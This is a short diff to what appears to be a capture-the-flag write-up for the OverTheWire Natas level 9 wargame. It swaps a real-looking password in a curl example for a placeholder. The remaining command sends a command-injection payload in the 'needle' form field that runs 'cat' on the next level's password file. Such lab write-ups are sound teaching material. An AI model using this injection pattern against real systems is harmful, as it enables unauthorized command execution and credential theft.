@@ -666,7 +666,7 @@ and appends a shell command that cats the password file.
 Example I used:
 
 ```bash
-curl -u natas9:ZE1ck82lmdGIoErlhQgWND6j2Wzz6b6t -d "needle=aa; cat /etc/natas_webpass/natas10 # " http://natas9.natas.labs.overthewire.org/
+curl -u natas9:natas9password -d "needle=aa; cat /etc/natas_webpass/natas10 # " http://natas9.natas.labs.overthewire.org/
 ```
 
 Server response (relevant part) shows the command output inside the page.
